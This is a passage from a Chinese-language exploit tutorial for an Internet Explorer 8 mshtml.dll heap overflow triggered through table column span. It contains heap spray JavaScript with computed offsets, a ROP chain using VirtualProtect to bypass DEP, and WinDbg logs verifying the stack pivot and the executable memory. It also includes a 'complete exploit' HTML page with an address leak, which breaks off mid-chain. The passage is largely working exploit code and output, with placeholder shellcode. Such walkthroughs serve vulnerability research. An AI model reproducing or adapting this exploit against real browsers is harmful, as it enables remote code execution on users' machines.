PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7240000 72c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 72c0000 7340000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7340000 73c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 73c0000 7440000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7440000 74c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 74c0000 7540000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7540000 75c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 75c0000 7640000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7640000 76c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 76c0000 7740000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] ...14fc0000 15040000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]15040000 150c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]150c0000 15140000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]15140000 151c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]151c0000 15240000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]15240000 152c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]152c0000 15340000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]15340000 153c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]153c0000 15440000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block]可以看到，喷射的范围可以说是很广了。这时我们需要选取一个地址，作为shellcode布置的地址，并覆写到虚表指针上去。因为IE8开启了DEP保护，所以要求我们精准的将虚表指针改写到rop链上，其余地方都是无法执行的。因为我们能够写入的数据都是125的倍数（width125），所以这里我任意选择一个地址 `‭943208 125 = 0x70706C8‬`然后我们去查看相应内存地址1234567891011121314150:013&gt; dd 07070010 l80007070010 90909090 90909090 90909090 cccccccc 07070020 90909090 90909090 90909090 90909090 &lt;===07070030 90909090 90909090 90909090 9090909007070040 90909090 90909090 90909090 9090909007070050 90909090 90909090 90909090 90909090...07070690 90909090 90909090 90909090 90909090070706a0 90909090 90909090 90909090 90909090070706b0 90909090 90909090 90909090 90909090070706c0 90909090 90909090 90909090 90909090 &lt;===070706d0 90909090 90909090 90909090 90909090070706e0 90909090 90909090 90909090 90909090070706f0 90909090 90909090 90909090 9090909007070700 90909090 90909090 90909090 90909090可以看到0x070706c8shellcode块的起始位置是0x07070020所以，如果我想在0x070706c8处布置shellcode，那么就需要在保持块的大小前提下，在前后布置一定的padding那么front_offset = (0x070706c8 - 0x07070020) / 2 = 0x354于是我们可以修改函数123456789101112131415161718function heap_spray()&#123; alert("spray..."); var offset = 0x354; var heap_obj = new heapLib.ie(0x10000); var code = unescape("%ucccc%ucccc"); //Code to execute var nops = unescape("%u9090%u9090"); //NOPs while (nops.length &lt; 0x1000) nops+= nops; // create big block of nops var front_padding = nops.substring(0,offset); var tail_padding = nops.substring(0, 0x800 - front_padding.length - code.length); var shellcode = front_padding + code + tail_padding; while (shellcode.length &lt; 0x40000) shellcode += shellcode; var block = shellcode.substring(2, 0x40000 - 0x21); //spray for (var i=0; i &lt; 500; i++) &#123; heap_obj.alloc(block); &#125; alert("done")&#125;这时再进行调试，就可以发现code已经布置在我们预期的位置上了1234567890:014&gt; dd 070706c8070706c8 cccccccc 90909090 90909090 90909090070706d8 90909090 90909090 90909090 90909090070706e8 90909090 90909090 90909090 90909090070706f8 90909090 90909090 90909090 9090909007070708 90909090 90909090 90909090 9090909007070718 90909090 90909090 90909090 9090909007070728 90909090 90909090 90909090 9090909007070738 90909090 90909090 90909090 90909090构造ROP既然已经能够成功泄露出基址，那么我们就可以很容易的构造rop了。这里我们会使用到mona.py用来寻找合适的gadget，它是Immunity Debugger的一个插件命令是：!mona rop -m mshtml.dll最后将生成的rop链转换成相对地址形式即可rop代码123456789101112131415161718192021222324252627function get_ropchain(mshtmlbase)&#123; var arr = [ mshtmlbase + Number(0x1d704), //# RETN mshtmlbase + Number(0x6801b), //# POP EBP # RETN mshtmlbase + Number(0x506603), //# XCHG EAX,ESP # RETN 栈转移 mshtmlbase + Number(0x25d87c), //# POP EAX # RETN [mshtml.dll] mshtmlbase + Number(0x1308), //# ptr to &amp;VirtualProtect() [IAT mshtml.dll] mshtmlbase + Number(0x1a02a1), //# MOV EAX,DWORD PTR DS:[EAX] # RETN [mshtml.dll] mshtmlbase + Number(0xcab0e), //# XCHG EAX,ESI # RETN [mshtml.dll] mshtmlbase + Number(0x50c71b), //# POP EBP # RETN [mshtml.dll] mshtmlbase + Number(0x1613b4), //# &amp; jmp esp [mshtml.dll] mshtmlbase + Number(0xa43ab), //# POP EBX # RETN [mshtml.dll] 0x201, //# 0x00000201-&gt; ebx mshtmlbase + Number(0x27e491), //# POP EDX # RETN [mshtml.dll] 0x40, //# 0x00000040-&gt; edx mshtmlbase + Number(0x6d267), //# POP ECX # RETN [mshtml.dll] mshtmlbase + Number(0x53cc05), //# &amp;Writable location [mshtml.dll] mshtmlbase + Number(0xfb460), //# POP EDI # RETN [mshtml.dll] mshtmlbase + Number(0x424902), //# RETN (ROP NOP) [mshtml.dll] mshtmlbase + Number(0xa8005), //# POP EAX # RETN [mshtml.dll] 0x90909090, // nop mshtmlbase + Number(0x4f25d2), //# PUSHAD # RETN [mshtml.dll] 0x90909090, 0x90909090 ]; return arr;&#125;ROP链的前三句，作用是栈转移，将esp转移到ROP链上因为eax中正是ROP起始地址，所以交换eax和esp的值即可达到目的。由《漏洞战争》中可知，虚表地址将会在这调用，eax保存了虚表指针值。1230:013&gt; u mshtml!NotifyElement+0x35mshtml!NotifyElement+0x3e:68067512 ff5008 call dword ptr [eax+8]因为是eax+8，所以首先执行的是rop链的第三句，然后完成栈转移后，将会回到第一句。第一句不做任何事，只是占位第二句将把第三句pop出去，防止再次交换eax和esp之后的部分会调用VirtualProtect()，修改内存属性，使紧接在rop链后面的内存可以执行，绕过DEP调试笔记首先通过打印log，获取vulheap中虚表指针所在的地址，然后在调用虚表处下条件断点123456789101112131415161718192021222324252627282930313233340:011&gt; dd 02b9a2f8 l10002b9a2f8 070706c8 070706c8 070706c8 00000000...02b9a5e8 70706c88 070706c8 070706c8 070706c802b9a5f8 00420042 00420042 00420042 70706c8802b9a608 070706c8 070706c8 070706c8 &lt;&lt;============ 地址：0x02b9a61002b9a618 02bbe920 68013c90 70706c88 070706c802b9a628 070706c8 070706c8 00000000 00000000...0:011&gt; bu mshtml!NotifyElement+0x35 &quot;.if(@ecx &amp; 0x0`ffffffff)=02b9a610 &#123;&#125; .else&#123;gc&#125;&quot;0:011&gt; geax=070706c8 ebx=01000000 ecx=02b9a610 edx=00000041 esi=025cf328 edi=02bbe920eip=68067512 esp=025cf164 ebp=025cf198 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!NotifyElement+0x3e:68067512 ff5008 call dword ptr [eax+8] ds:0023:070706d0=683a66030:005&gt; teax=070706c8 ebx=01000000 ecx=02b9a610 edx=00000041 esi=025cf328 edi=02bbe920eip=683a6603 esp=025cf160 ebp=025cf198 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!Ptls5::FsDestroyLayoutState+0x32b:683a6603 94 xchg eax,esp...0:005&gt; eax=00000001 ebx=00000201 ecx=070706bc edx=779764f4 esi=765950ab edi=682c4902eip=680013b4 esp=07070714 ebp=680013b4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!cbSystemColorsSize+0x38:680013b4 ffe4 jmp esp &#123;07070714&#125;0:005&gt; eax=00000001 ebx=00000201 ecx=070706bc edx=779764f4 esi=765950ab edi=682c4902eip=07070714 esp=07070714 ebp=680013b4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0000020207070714 90 nop在执行完rop后，会回到rop的结尾处，此时查看此处的内存属性123456780:005&gt; !vprot 07070714BaseAddress: 07070000AllocationBase: 07050000AllocationProtect: 00000004 PAGE_READWRITERegionSize: 00001000State: 00001000 MEM_COMMITProtect: 00000040 PAGE_EXECUTE_READWRITEType: 00020000 MEM_PRIVATE可以发现已经具有执行权限，只需将shellcode布置到此处即可。完整利用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;html&gt;&lt;head&gt; &lt;script type="text/javascript" src="heaplib.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="evil"&gt;&lt;/div&gt; &lt;script&gt; var free = "EEEE"; while (free.length &lt; 480) free += free; var string1 = "AAAA"; while (string1.length &lt; 480) string1 += string1; var string2 = "BBBB"; while (string2.length &lt; 480) string2 += string2; var fr = new Array(); var al = new Array(); var div_container = document.getElementById("evil"); div_container.style.cssText = "display:none"; for (var i = 0; i &lt; 500; i+=2) &#123; fr[i] = free.substring(0, (0x100 - 6) / 2); al[i] = string1.substring(0, (0x100 - 6) / 2); al[i+1] = string2.substring(0, (0x100 - 6) / 2); var obj = document.createElement("button"); div_container.appendChild(obj); &#125; for (var i = 200; i &lt; 500; i += 2) &#123; fr[i] = null; CollectGarbage(); &#125; &lt;/script&gt; &lt;table style="table-layout:fixed" &gt;&lt;col id="0" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="1" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="2" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="3" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="4" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="5" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="6" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="7" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="8" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="9" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="10" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="11" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="12" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="13" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="14" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="15" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="16" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="17" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="18" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="19" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="20" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="21" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="22" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="23" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="24" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="25" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="26" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="27" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="28" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="29" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="30" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="31" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="32" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="33" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="34" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="35" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="36" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="37" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="38" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="39" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="40" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="41" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="42" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="43" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="44" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="45" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="46" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="47" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="48" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="49" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="50" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="51" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="52" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="53" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="54" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="55" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="56" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="57" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="58" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="59" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="60" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="61" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="62" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="63" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="64" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="65" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="66" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="67" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="68" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="69" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="70" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="71" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="72" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="73" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="74" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="75" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="76" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="77" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="78" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="79" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="80" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="81" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="82" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="83" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="84" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="85" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="86" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="87" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="88" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="89" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="90" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="91" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="92" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="93" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="94" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="95" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="96" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="97" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="98" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="99" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="100" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="101" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="102" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="103" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="104" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="105" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="106" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="107" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="108" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="109" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="110" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="111" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="112" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="113" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="114" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="115" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="116" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="117" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="118" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="119" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="120" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="121" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="122" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="123" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="124" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="125" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="126" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="127" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="128" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="129" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="130" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="131" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="132" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt; &lt;script&gt; var mshtmlbase; function leak() &#123; var leak_col = document.getElementById("132"); leak_col.width = 41; leak_col.span = 19; &#125; function get_leak()&#123; for (var i = 0; i &lt; 500; i++) &#123; if (al[i].length &gt; (0x100 - 6) / 2) &#123; var leak = al[i].substring((0x100 - 6) / 2 + (2 + 8) / 2, (0x100 - 6) / 2 + (2 + 8 + 4) / 2); leak_addr = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16); //alert("虚表指针: 0x" + leak_addr.toString(16)); mshtmlbase = leak_addr - 0x173af8; //alert("mshtml.dll基址: 0x" + mshtmlbase.toString(16)); break; &#125; &#125; &#125; function get_ropchain(mshtmlbase)&#123; var arr = [ mshtmlbase + Number(0x1d704), mshtmlbase + Number(0x6801b), //# POP EBP # RETN mshtmlbase + Number(0x506603), //# XCHG EAX,ESP # RETN mshtmlbase + Number(0x25d87c), //# POP EAX # RETN [mshtml.dll] 